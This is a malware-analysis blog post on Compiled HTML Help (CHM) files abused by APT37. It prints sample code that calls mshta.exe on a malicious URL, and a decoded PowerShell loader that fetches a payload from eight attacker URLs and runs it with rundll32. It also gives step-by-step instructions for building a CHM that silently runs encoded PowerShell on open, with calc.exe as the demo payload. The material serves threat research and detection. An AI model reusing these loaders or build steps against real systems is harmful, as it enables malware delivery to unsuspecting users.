---
ID: 20241114145726
date: 2024-11-15
tags:
  - Blogging
  - Malware_Analysis/technique
Created: 2024-11-14:14:49:40
Last Modified: 2024-11-14:14:49:45
draft: false
---
![[Pasted image 20241115034745.png]]
# Description

> Monkey See Monkey Do, I wonder how the CHiMpanzee drool.

I have came across a few tweets in the past week with `CHM` file being used as part of an attack chain which I had no knowledge about. Therefore, this post is used to explore some samples to find out a little more about `Compiled HTML Help files` A.K.A `HTMLHelp`. Additionally, to better understand, I have also documented a method to replicate one of the samples to spawn a calculator instead.
# What is CHM

CHM is a file format consisting of collection of HTML pages. It is also an archive of files. It is a Microsoft-proprietary format used to deliver "help" like documentation, tutorials and other resources. All of these are packed into a single compressed file which are commonly used in software help documentation. 

We can also recognize `chm` files via the header value `ITSF`. From the hex dump, we can also see some HTML files which would be part of the [[#^e36d70|Table of Contents.hhc]].

![[Pasted image 20241114192625.png]]

The following shows example files from the malware sample listed in the [[#^127b39|sample overview]].
# Commands

This section explores at least two methods of usage of commands in `chm` files for delivering malware payload in an attack chain.
## Running MSHTA.exe - (APT37)

Let's look at the first example used by APT37. 
### Sample Overview

^127b39

The following `chm` is present in [VirusTotal](https://www.virustotal.com/gui/file/9fdc4b3d6fbccc1abd8a08acd52b6380627e350faa99fcc348e5ed366c7b37af) which is used by APT37.

| Name                      | SHA256                                                           |
| ------------------------- | ---------------------------------------------------------------- |
| pay_202201_5_02-10424.chm | 9fdc4b3d6fbccc1abd8a08acd52b6380627e350faa99fcc348e5ed366c7b37af |

![[Pasted image 20241114150706.png]]

### Extracted Archive 

The following shows some of the items that were found in this compressed file. We can also make use of [[#^70e72b|HTTP Help Workshop Tool]] to "decompile" as well. You can do so by clicking on `File > decompile` to set the compiled help file and the output location to place the extracted files.

![[Pasted image 20241114151041.png]]
#### An Attack Chain by APT37
The attack chain diagram is taken from [ZScalar's post](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37).

![[Pasted image 20241114184553.png]]
#### Table of `Contents.hhc`

^e36d70

This `.hhc` file is used to define the table of contents and navigation for a `CHM` file. This gives structure, potentially URLs or file links which leads to malicious resources. We can read more about the [contents](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/contents) from Microsoft documentation.

Here is what is in the `Table of Contents.hhc` file:

```xml
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
<OBJECT type="text/site properties">
	<param name="FrameName" value="1">
	<param name="Window Styles" value="0x800025">
	<param name="ImageType" value="Folder">
</OBJECT>
<UL>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Start">
		<param name="Local" value="Start.html">
		</OBJECT>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Main">
		<param name="Local" value="Main.html">
		</OBJECT>
</UL>
</BODY></HTML>
```

#### Start.html
This is the first file that gets rendered. The `Command` here is `ShortCut`. An object with id `x` is created as a button which handles the shortcut. One of the item being a command to run `mshta.exe` to execute the `9.html`. Unfortunately, I am not able to find the original `9.html` on VirusTotal. However, that gives a really good idea about how `chm` files are used as part of the chain when delivering malware.

```html
<HTML>
<TITLE>  ��������������  </TITLE>
<HEAD>
</HEAD>
<BODY>
<H1 align=center>   �������������� </h1>
<br>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
<PARAM name="Button" value="Bitmap::shortcut">
<PARAM name="Item1" value=",mshta.exe,http://attiferstudio.com/install.bak/sony/9.html ,">
<PARAM name="Item2" value="273,1,1">
</OBJECT>
<script>
x.Click();
location.href="Main.html";
</SCRIPT>
</BODY>
</HTML>
```
##### Suspicious Network IOC

| Domain                                       | Port |
| -------------------------------------------- | ---- |
| attiferstudio.]com/install.]bak/sony/9.]html | 80   |
This domain is marked as malicious by Mandiant.

According to [Shortcut | Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/shortcut):

> [!note]
> Creates a shortcut to a specified action by passing Windows-based messages and parameters. For example, if a topic discusses a procedure that involves a specific dialog box, you can provide a link that a user can click in the topic to open the dialog box in the program.


The following shows the output in `FakeNet` tool
```
11/13/24 11:59:48 PM [    HTTPListener80]   GET /install.bak/sony/9.html HTTP/1.1
11/13/24 11:59:48 PM [    HTTPListener80]   Accept: */*
11/13/24 11:59:48 PM [    HTTPListener80]   Accept-Language: en-SG
11/13/24 11:59:48 PM [    HTTPListener80]   UA-CPU: AMD64
11/13/24 11:59:48 PM [    HTTPListener80]   Accept-Encoding: gzip, deflate
11/13/24 11:59:48 PM [    HTTPListener80]   User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)
11/13/24 11:59:48 PM [    HTTPListener80]   Host: attiferstudio.com
11/13/24 11:59:48 PM [    HTTPListener80]   Connection: Keep-Alive
11/13/24 11:59:48 PM [    HTTPListener80]
```
	

#### Main.html

This file contains the JavaScript Payload obfuscated which can be de-obfuscated with [https://obf-io.deobfuscate.io/](https://obf-io.deobfuscate.io/). 

We can see a stark difference between the obfuscated and de-obfuscated code.
##### Obfuscated Code
![[Pasted image 20241114154320.png]]
##### De-obfuscated

![[Pasted image 20241114154417.png]]

The string array here give hints that there are further encoding end decoding that needs to be done. Furthermore, there seem to be some cryptographic operations performed as well as some hints of this sample being a download. It seems to also deal with different browser types and has different ways to deal with download blob data. As de-obfuscation isn't the main focus, I won't be dealing with it here.

`Copyright(C) 2014 rimesoft.com` string looks interesting but I have found just one available entry on Google.

![[Pasted image 20241114175537.png]]
http://windowfin.com/bbs/board.php/board.php?bo_table=windowfin&wr_id=592329 links to [windowsexeAllkiller.com](http://windowexeallkiller.com/). This domain is hosted in Kakao Corp.

![[Pasted image 20241114180046.png]]

The hash there seems legitimate according to [Virustotal - ec386aa4a8e53033f92b80291c51e8b4](https://www.virustotal.com/gui/file/400911553f852ebf3e719a3d9fe03f8403546a8e397e1590f94195aa4e43644e). Furthermore, we see the `neolook@gmail.com` string as well in the [[#^5dfb55|full string listing]].

![[Pasted image 20241114175711.png]]
##### Full `_0x11db` String Array

^5dfb55

```js
var _0x11db = ["str2bin", "bin2str", "hex2bin", "bin2hex", "encode64", "decode64", "UTF8Decode", "UTF8Encode", "insertJS", "length", "charCodeAt", "", "fromCharCode", "0x", "indexOf", "0X", "substring", "replace", "floor", "slice", "0", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=", "charAt", "split", "join", "=", "\n", "head", "getElementsByTagName", "script", "createElement", "type", "text/javascript", "text", "appendChild", "hostname", "location", "protocol", "host", "pathname", "callLicense", "checkLicense1", "checkLicense2", "aaa", "bbb", "ccc", "ddd", "a : ", ", b : ", ", c : ", ", d : ", "innerHTML", "rime_jsguard_license", "getElementById", "Copyright(C) 2014 rimesoft.com. All rights reserved.", "rime_jsguard_licenseCheck", "By Sim,Jaehoon <neolook@gmail.com", "getDay", "Today is Sunday", "Today is Monday", "Today is Tuesday", "Today is Wednesday", "Today is Thursday", "Today is Friday", "Today is Saturday", "demo", "0123456789abcdef", "sha256", "sha256_self_test", "message digest", "f7846f55cf23e14eebeab5b4e1550cad5b509e3348fbc4efa3a1413d393cb650", "keySize", "numberOfRounds", "masterKey", "encRoundKeys", "decRoundKeys", "(Error)setupEncRoundKeys1 : Wrong Key Size.", "(Error)setupEncRoundKeys2 : Wrong Key.", "(Error)setupDecRoundKeys1 : Wrong Key Size.", "(Error)setupDecRoundKeys2 : Wrong Key.", "(Error)encrypt : Wrong Key Size.", "(Error)encrypt : Wrong Key.", "(Error)decrypt : Wrong Key Size.", "(Error)decrypt : Wrong Key.", "ceil", " ", "* ", " \n", "object", "number", "string", "concat", "Error: Wrong Key Size5.", "(Error)setKey : Wrong Key.", "getKeySize", "encrypt", "CBC", "ECB", "decrypt", "LITTLE", "BIG", "ENDIAN", "(Error)setupRoundKeys1 : Wrong Key Size.", "(Error)setupRoundKeys2 : Wrong Key.", "(Error)encryptSeed1 : Wrong Key Size.", "(Error)encryptSeed2 : Wrong Key.", "(Error)decryptSeed1 : Wrong Key Size.", "(Error)decryptSeed2 : Wrong Key.", "SEED ERR 001", "SEED ERR 002", "SEED ERR 003", "/", "//", "COPYRIGHT", "Co", "pyr", "ig", "ht(", "C) 2", "1", "4 ri", "me", "so", "ft.co", "m. A", "ll r", "igh", "ts re", "ser", "ve", "d.", "PROCESS", "substr", "<!-- -->", "<!--LIC_TO RIMESOFT-->", "unisafe_smail_process", "<!--LIC_TO", "unisafe_attach_process", "unisafe_smail_process_online_v01", "서버 접속 정보가 없습니다.\n정상적인 보안 메일이 아닙니다.", "unisafe_attach_process_online_v01", "&hash_data=", "&jsoncallback=?", "Result", ",", "OK", "서버로부터 받은 값이 정상적이지 않습니다(03).\n", "neolook_test==>", "서버로부터 받은 값이 정상적이지 않습니다(02).\n", "서버로부터 받은 값이 정상적이지 않습니다(01).\n", "(수신된 값이 없음)", "getJSON", "%20", "abort", "인터넷에 연결되어 있지 않은 경우 보안메일 열람이 불가능합니다.", "match", "userAgent", "application/octet-stream", "safari", "toLowerCase", "chrome", "Safari의 경우 이름을 변경할 수 없으며,\n", "사용자의 다운로드 폴더에 Unknown 또는 Unknown-숫자 형식으로 저장됩니다.\n\n", "완료 후 다운로드 폴더의 Unknown 파일을 \n", "[ ", " ]로\n", "바꾼 다음 사용하시기 바랍니다.\n\n", "[주의 : 큰 파일(3MB 이상)일 경우 safari가 다운될 수 있습니다.]", "application/octet-stream;base64,", "data:", "a", "download", "setAttribute", "href", "display", "style", "none", "onclick", "target", "removeChild", "body", "MouseEvent", "createEvent", "click", "initEvent", "dispatchEvent", "BlobBuilder", "WebKitBlobBuilder", "MozBlobBuilder", "MSBlobBuilder", "name", "TypeError", "append", "getBlob", "InvalidStateError", "unsupported browser", "msSaveBlob", "navigator", "Download File", "webkitURL", "firefox", "createObjectURL", "URL", "SEED-CBC", "write", "128"];
```

##### Translations
- `서버 접속 정보가 없습니다.\n정상적인 보안 메일이 아닙니다. `
	- There is no server connection information. This is not legitimate secure mail.
- `서버로부터 받은 값이 정상적이지 않습니다(03).`
	- The value received from the server is not normal (03).
- `서버로부터 받은 값이 정상적이지 않습니다(02).`
	- The value received from the server is not normal (02).
- `서버로부터 받은 값이 정상적이지 않습니다(01)`
	- The value received from the server is not normal (01)
- `(수신된 값이 없음)`
	- (no value received)
- `인터넷에 연결되어 있지 않은 경우 보안메일 열람이 불가능합니다.`
	- If you're not connected to the internet, you can't view your secure mail.
- `Safari의 경우 이름을 변경할 수 없으며,`
	- For Safari, you can't rename it,
- `사용자의 다운로드 폴더에 Unknown 또는 Unknown-숫자 형식으로 저장됩니다.`
	- It is saved in the user's Downloads folder in an Unknown or Unknown-number format.
- `완료 후 다운로드 폴더의 Unknown 파일을 `
	- After completion, move the Unknown file in the Downloads folder to the
- `바꾼 다음 사용하시기 바랍니다.`
	- before using it.
- `[주의 : 큰 파일(3MB 이상)일 경우 safari가 다운될 수 있습니다.]`
	- \[Caution: large files (3MB or more) may cause safari to crash\].

### Different Sample, Same IOC by ZScalar



In this analysis, the same suspicious IOC was also used which is attributed to `APT37` which targets South Korean Entities. [Blog by ZScalar](https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37) has included many `chm` hashes that we can reference as well.

Their `chm` file also downloads a similar filename `9.html` . 

![[Pasted image 20241114180645.png]]

Here is another example of a help window showing text in Korean and getting from same domain but a `10.html`.

![[Pasted image 20241114182801.png]]
![[Pasted image 20241114182642.png]]

## Running Powershell.exe

Let's look at another example where instead of using `mshta.exe`, it made use of powershell commands to run encoded scripts.
### Sample Overview

^127b39

The following `chm` is present in [VirusTotal](https://www.virustotal.com/gui/file/9fdc4b3d6fbccc1abd8a08acd52b6380627e350faa99fcc348e5ed366c7b37af) which is used by APT37.

| Name               | SHA256                                                           |
| ------------------ | ---------------------------------------------------------------- |
| README-yD8348.chm) | 4e52c186ef4cbfc9249cd03416f17825138b449bcaddd7b79fe9a89b898d67fd |
|                    |                                                                  |

From the content preview, we can some sus html files. They are `propagandising.htm` and the `README-yD8348.hhc` which is the structure for `chm`.

![[Pasted image 20241114195552.png]]

### `README-yD8348.hhc`

^c1c8e6

This masquerades as a help documents that gives instruction on some IP settings.

![[Pasted image 20241114200346.png]]
Here is the content in the `.hhc` file.
```xml
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced IP Settings Tab">
      <param name="Local" value="README-yD8348.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Advanced WINS Tab">
      <param name="Local" value="propagandising.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 Alternate Configuration Tab">
      <param name="Local" value="README-yD8348.htm">
  </OBJECT>
  </UL>
  <UL>
  <LI> <OBJECT type="text/sitemap">
      <param name="Name" value="IPv4 and IPv6 Advanced DNS Tab">
      <param name="Local" value="propagandising.htm">
  </OBJECT>
  </UL>
</BODY>
</HTML>

```

### `README-yD8348.htm`
The `propagandising.htm` does not seem to contain anything suspicious. However, the `README-yD8348.htm` contains command objects as `ShortCut` similar to what we have [[#Start.html|seen previously]]. 

#### Encoded Command

This chunk of encoded command contains the 8 attacker domains addresses.

```html
<HTML>
<TITLE>Check for Windows updates from Command Line</TITLE>
<HEAD>
</HEAD>
<BODY>
<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
<PARAM name="Command" value="ShortCut">
 <PARAM name="Button" value="Bitmap::shortcut">
 <PARAM name="Item1" value=",cmd.exe,/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANQA7ACQAQQBuAG4AZQB4AGUAZABNAGEAbQBpAGwAbABhACAAPQAgACgAIgBoAHQAdABwAHMAOgAvAC8AbQByAGMAcgBpAHoAcQB1AG4AYQAuAGMAbwBtAC8ATAA3AGMAYwBOAC8AegBkAHAAMQBYAHYAQwBiADYALABoAHQAdABwAHMAOgAvAC8AbgBhAHkAYQBkAG8AZgBvAHUAbgBkAGEAdABpAG8AbgAuAG8AcgBnAC8AdwBYAGEASwBtAC8AQQBHAEkAZgA3AGgAQQB1AGcALABoAHQAdABwAHMAOgAvAC8AZwBzAHMAYwBvAHIAcABvAHIAYQB0AGkAbwBuAGwAdABkAC4AYwBvAG0ALwBvAGsAUwBmAGoALwBpADYAdAA5AGcAdQBwACwAaAB0AHQAcABzADoALwAvAGgAbwB0AGUAbABsAG8AcwBtAGkAcgB0AG8AcwAuAGMAbwBtAC8AcwBqAG4ALwBjAGoAOABvAFUATgAsAGgAdAB0AHAAcwA6AC8ALwBjAGEAcgBsAGEAZAB2AG8AZwBhAGQAYQB0AHIAaQBiAHUAdABhAHIAaQBhAC4AYwBvAG0ALwB0AHYAbgBxADkALwBzAGkAZQA4ADcALABoAHQAdABwAHMAOgAvAC8AegBhAGkAbgBjAG8ALgBuAGUAdAAvAE8AZABPAFUALwB6AG4AbABRAGYAUgBqAGoAOQBFAHcAaQAsAGgAdAB0AHAAcwA6AC8ALwBjAGkAdAB5AHQAZQBjAGgALQBzAG8AbAB1AHQAaQBvAG4AcwAuAGMAbwBtAC8ANgBNAGgAMQBrAC8AQQA3AHIAaQBYADMAMAB5AHUALABoAHQAdABwAHMAOgAvAC8AZQByAGcALQBlAGcALgBjAG8AbQAvAG8AYwBtAGIALwB6AGQAegB0AEsARgBDAEgAMQBIACIAKQAuAHMAcABsAGkAdAAoACIALAAiACkAOwBmAG8AcgBlAGEAYwBoACAAKAAkAG0AZQByAGMAdQByAGkAZAAgAGkAbgAgACQAQQBuAG4AZQB4AGUAZABNAGEAbQBpAGwAbABhACkAIAB7AHQAcgB5ACAAewB3AGcAZQB0ACAAJABtAGUAcgBjAHUAcgBpAGQAIAAtAFQAaQBtAGUAbwB1AHQAUwBlAGMAIAAxADUAIAAtAE8AIAAkAGUAbgB2ADoAVABFAE0AUABcAHcAYQB5AGYAYQByAGUAcgBzAEMAbwBvAHAAdABlAGQALgBhAG4AZQBtAG8AbgBpAG4AUABhAHIAYQBiAG8AbABpAHoAZQA7AGkAZgAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAkAGUAbgB2ADoAVABFAE0AUABcAHcAYQB5AGYAYQByAGUAcgBzAEMAbwBvAHAAdABlAGQALgBhAG4AZQBtAG8AbgBpAG4AUABhAHIAYQBiAG8AbABpAHoAZQApAC4AbABlAG4AZwB0AGgAIAAtAGcAZQAgADEAMAAwADAAMAAwACkAIAB7AHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBOAG8ATABvAGcAbwAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAGUAbgBjAG8AZABlAGQAYwBvAG0AbQBhAG4AZAAgACIAYwB3AEIAMABBAEcARQBBAGMAZwBCADAAQQBDAEEAQQBjAGcAQgAxAEEARwA0AEEAWgBBAEIAcwBBAEcAdwBBAE0AdwBBAHkAQQBDAEEAQQBKAEEAQgBsAEEARwA0AEEAZABnAEEANgBBAEYAUQBBAFIAUQBCAE4AQQBGAEEAQQBYAEEAQgAzAEEARwBFAEEAZQBRAEIAbQBBAEcARQBBAGMAZwBCAGwAQQBIAEkAQQBjAHcAQgBEAEEARwA4AEEAYgB3AEIAdwBBAEgAUQBBAFoAUQBCAGsAQQBDADQAQQBZAFEAQgB1AEEARwBVAEEAYgBRAEIAdgBBAEcANABBAGEAUQBCAHUAQQBGAEEAQQBZAFEAQgB5AEEARwBFAEEAWQBnAEIAdgBBAEcAdwBBAGEAUQBCADYAQQBHAFUAQQBMAEEAQgBOAEEARwA4AEEAZABBAEIAawBBAEQAcwBBACIAOwBiAHIAZQBhAGsAOwB9AH0AYwBhAHQAYwBoACAAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA1ADsAfQB9AA==">
 <PARAM name="Item2" value="273,1,1">
</OBJECT>
<SCRIPT>
x.Click();
</SCRIPT>
<html DIR="LTR" xmlns:MSHelp="http://msdn.microsoft.com/mshelp" xmlns:ddue="http://ddue.schemas.microsoft.com/authoring/2003/5" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:tool="http://www.microsoft.com/tooltip"><head><META HTTP-EQUIV="Content-Type" CONTENT="text/html; CHARSET=Windows-1252"></META><META NAME="save" CONTENT="history"></META><title>IPv4 Advanced IP Settings Tab</title><link rel="stylesheet" type="text/css" href="../local/Classic.css"></link><script src="../local/script.js"></script></head><body><div id="header"><h1>IPv4 Advanced IP Settings Tab</h1></div><div id="mainSection"><div id="mainBody"><p class="runningHeader"></p>
<p>You can use the settings on this tab for this network connection only if you are not using the <b>Obtain an IP address automatically</b> on the <b>General</b> tab.</p>
<p><b>IP addresses</b> lists additional Internet Protocol version 4 (IPv4) addresses that can be assigned to this network connection. There is no limit to the number of IP addresses that can be configured. This setting is useful if this computer connects to a single physical network but requires advanced IP addressing because of either of the following reasons:</p>
...
...
```

The decoded PowerShell command is as follows:

```powershell
Start-Sleep -Seconds 5;
$AnnexedMamilla = (
"https://mrcrizquna.com/L7ccN/zdp1XvCb6,https://nayadofoundation.org/wXaKm/AGIf7hAug,https://gsscorporationltd.com/okSfj/i6t9gup,https://hotellosmirtos.com/sjn/cj8oUN,https://carladvogadatributaria.com/tvnq9/sie87,https://zainco.net/OdOU/znlQfRjj9Ewi,https://citytech-solutions.com/6Mh1k/A7riX30yu,https://erg-eg.com/ocmb/zdztKFCH1H").split(",");

foreach ($mercurid in $AnnexedMamilla) {
	try {
		wget $mercurid -TimeoutSec 15 -O $env:TEMP\wayfarersCoopted.anemoninParabolize
		if ((Get-Item $env:TEMP\wayfarersCoopted.anemoninParabolize).length -ge 100000) {
			powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand "cwB0AGEAcgB0ACAAcgB1AG4AZABsAGwAMwAyACAAJABlAG4AdgA6AFQARQBNAFAAXAB3AGEAeQBmAGEAcgBlAHIAcwBDAG8AbwBwAHQAZQBkAC4AYQBuAGUAbQBvAG4AaQBuAFAAYQByAGEAYgBvAGwAaQB6AGUALABNAG8AdABkADsA";
			break;
		}
	}
	catch {
	Start-Sleep -Seconds 5;
	}
}
```
#### Suspicious Network IOC

- hxxps://mrcrizquna.]com/L7ccN/zdp1XvCb6
- hxxps://nayadofoundation.rg/wXaKm/AGIf7hAug
- hxxps://gsscorporationltd.]com/okSfj/i6t9gup
- hxxps://hotellosmirtos.]com/sjn/cj8oUN
- hxxps://carladvogadatributaria.].com/tvnq9/sie87
- hxxps://zainco.]net/OdOU/znlQfRjj9Ewi
- hxxps://citytech-solutions.]com/6Mh1k/A7riX30yu
- hxxps://erg-eg.]com/ocmb/zdztKFCH1H

`FakeNet` captures this and indicated signs of `powershell.exe` as well.

![[Pasted image 20241114202422.png]]

### Running Downloaded Malware using `rundll32`
The inner `powershell` command to execute is:

```powershell
start rundll32 $env:TEMP\wayfarersCoopted.anemoninParabolize,Motd;
```

# Steps for Creating our own CHM file

`CHM` can be created with the help of `HTML Help Workshop` which can be downloaded from [internet archive](https://web.archive.org/web/20160201063255/http://download.microsoft.com/download/0/A/9/0A939EF6-E31C-430F-A3DF-DFAE7960D564/htmlhelp.exe). Note that this downloaded file may be flagged by Windows Defender as a threat. ^70e72b
### 1. Create New Project

We can first start out by creating a new Project. I will name this project `Fake IT HelpDesk`.

![[Pasted image 20241114232743.png]]
When creating a new project, realize that we can have different types of file. I found that we can just skip this unless we have something done up already which we don't.

![[Pasted image 20241114220241.png]]

We will then be greeted with the following User Interface.

![[Pasted image 20241114232904.png]]

## 2. Creating a new Help Page

We can now create a new page by going to `File > New > HTML File`. I have set the name of the page to `IT Help Desk`.

![[Pasted image 20241114233059.png]]

Let's edit this script with anything you want. After that, we can save the file. I will be replacing with the following content and saving as `help.htm`:

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<Title>IT HelpDesk</Title>
<style>
        body {
            text-align: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f0f4f8;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            background-color: #1a237e;
            color: white;
            text-align: center;
            padding: 1em 0;
            margin-bottom: 2em;
        }
        h1 {
            margin: 0;
        }
        .concept {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            margin-bottom: 2em;
            overflow: hidden;
        }
        .concept-header {
            background-color: #3949ab;
            color: white;
            padding: 1em;
        }
        .concept-content {
            padding: 1em;
        }
        .concept h2 {
            margin: 0;
        }
        .concept p {
            margin-bottom: 0;
        }
    </style>
</HEAD>
<BODY>
   <header>
        <h1>Understanding HTTP</h1>
    </header>
    <div class="container">
        <div class="concept">
            <div class="concept-header">
                <h2>What is HTTP?</h2>
            </div>
            <div class="concept-content">
                <p>HTTP (Hypertext Transfer Protocol) is the foundation of data communication on the World Wide Web. It's a protocol that allows for the transfer of data between a client (usually a web browser) and a server.</p>
            </div>
        </div>
        <div class="concept">
            <div class="concept-header">
                <h2>HTTP Methods</h2>
            </div>
            <div class="concept-content">
                <p>HTTP defines several request methods to indicate the desired action to be performed on the identified resource. The most common methods are GET (retrieve data), POST (submit data), PUT (update data), and DELETE (remove data).</p>
            </div>
        </div>
        <div class="concept">
            <div class="concept-header">
                <h2>HTTP Status Codes</h2>
            </div>
            <div class="concept-content">
                <p>HTTP status codes are three-digit numbers returned by a server in response to a client's request. They are grouped into five classes: Informational responses (100–199), Successful responses (200–299), Redirects (300–399), Client errors (400–499), and Server errors (500–599).</p>
            </div>
        </div>
        <div class="concept">
            <div class="concept-header">
                <h2>HTTP Headers</h2>
            </div>
            <div class="concept-content">
                <p>HTTP headers allow the client and the server to pass additional information with the request or the response. They define the operating parameters of an HTTP transaction. Common headers include Content-Type, User-Agent, and Authorization.</p>
            </div>
        </div>
    </div>
</BODY>
</HTML>

```

 
## 3. Adding Topics 

We can now add topic by clicking on the annotated button and add in the `help.htm` file. 

 ![[Pasted image 20241115025202.png]]

You can continue to [[#Creating a new Help Page|create more new pages]] and add it as topics in this step. I shall leave it for now. We should now be able to find the `help.htm` under the `[FILES]` section.

![[Pasted image 20241115025248.png]]

## 4. Adding to Table Of Content (TOC)

We can now click on the `Contents` tab. After that, we can select the `Create a new contents file` since we do not have any existing one. This is the `hhc` file just like [[#^c1c8e6|discussed earlier]]. We can rename this to anything but the default seems to be `Table of Contents.hhc`. I will save it as the default.

## 5. Adding the `ShortCut`

We can now click on the `HTML Help ActiveX Control` button. This is where you can create or modify the Command that we have [[#Commands|discussed earlier]]. 

![[Pasted image 20241115025323.png]]

We can select `ShortCut`  in the command dropdown and for this post, we won't be using any scripting to access the command so I'll just leave it.

![[Pasted image 20241115025416.png]]

I have selected the type to `HIDDEN`
![[Pasted image 20241115025433.png]]

For this program, I have set up a fake python server to run a PowerShell script to run `calc.exe` similar to the [[#Running Powershell.exe|second example]].

This are the inputs:
- `Program`: `cmd.exe`
- `Parameters`: `/c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -encodedcommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAYQBsAGMALgBlAHgAZQA=`
	- "Start-Process calc.exe" in Unicode

![[Pasted image 20241115025940.png]]

Next, we can leave the `Message`, `WPARAM` and `LPARAM` empty for now and click Next , then Finish.
We should now see the new Object being added into the source automatically at where your cursor was.

![[Pasted image 20241115030031.png]]

> [!note]
> We can then call the function `Click` on that created button 

```js
// <id_of_button>.Click()
<script> hhctrl.Click()</script>
```
## 6. Compilation

To compile, click `File > compile`

![[Pasted image 20241115030556.png]]

## 7. Execution

Now, we can look for our `Fake_IT_HelpDesk.chm` file and run it. In Windows 11 at least, it would warn it we wish to view blocked content.
![[Pasted image 20241115030919.png]]

Let's just assume that the user allowed to view blocked content due to compelling reason, we should see the calculator spawned! 

![[Pasted image 20241115031331.png]]

# Looking at our Newly Created CHM

Let's look at the archive:
![[Pasted image 20241115032031.png]]

We see our `hhc` file which should contain the structure for the compressed folder. Next, the `help.htm` is also present!

# References
- [What is CHM and Why Isn’t It Dead Yet](https://medium.com/level-up-web/what-is-chm-and-why-isnt-it-dead-yet-5f3e1db0cee7)
- [CHM - Compiled HTML Help File Format](https://docs.fileformat.com/web/chm/)
- https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/contents
- https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt3


# Annex A - Indicators Of Compromise (IOCs) by ZScalar

Lifted from: https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt3
## Archive file hashes  

| **MD5 hash**                     | **Archive filename**                                       |
| -------------------------------- | ---------------------------------------------------------- |
| 3dd12d67844b047486740405ae96f1a4 | (20220120)2022년 총동창회 신년인사001.rar                           |
| e9cd4c60582a587416c4807c890f8a5b | (양식) 제20대 대통령 취임식 재외동포 참석자 추천 명단(국민의힘당원 000).rar           |
| 6dc7795dde643aae9ced8e22db335ad1 | 1.rar                                                      |
| e3879ea3f695706dfc3fc1fb68c6241d | 2017-APEC.rar                                              |
| 17bc6298bf72fa76ad6e3f29536e2f13 | 2022 후기 신-편입생 모집요강.rar                                     |
| 54a99efd1b9adec5dc0096c624f21660 | 2022-01-27-notification.rar                                |
| f3f4cf7876817b1e8a2d49fe9bd7b206 | 2022-03-22.rar                                             |
| bb182e47e1ffc0e8335b3263112ffdb1 | 2022-04-14.rar                                             |
| 9d85c8378b5f1edefb1e9837b3abb74f | 2022.04.27.rar                                             |
| cb33ef9c824d16ff23af4e01f017e648 | 2022.rar                                                   |
| 75fe480a0669e80369eaf640857c27cd | 20220315-112_Notice.rar                                    |
| 6db5f68b74c8ba397104da419fcc831d | 202203_5_06.rar                                            |
| cfd73942f61fbb14dded15f3d0c92f4a | 20220510_115155.rar                                        |
| 5c67c9266e4267d1bf0862bf2c7bd2a5 | 20220913.rar                                               |
| 1531bba6a8028d38d36c0a91b91159c3 | 20220916093205755684_TSA.rar                               |
| afdc59ec36ac950de08169162783accd | 2022년 국방부 부임이사 안내(몽골리아).rar                                |
| 06c112968cdde43c3424bdf0a2a00928 | 20230302_Guide.rar                                         |
| 6ab401c83095129a182b9be0359d602d | 3사복지업무.rar                                                 |
| 93e94b673c6d1ea6d615c0102dc77610 | Ambassador Schedule Week 6 2023.rar                        |
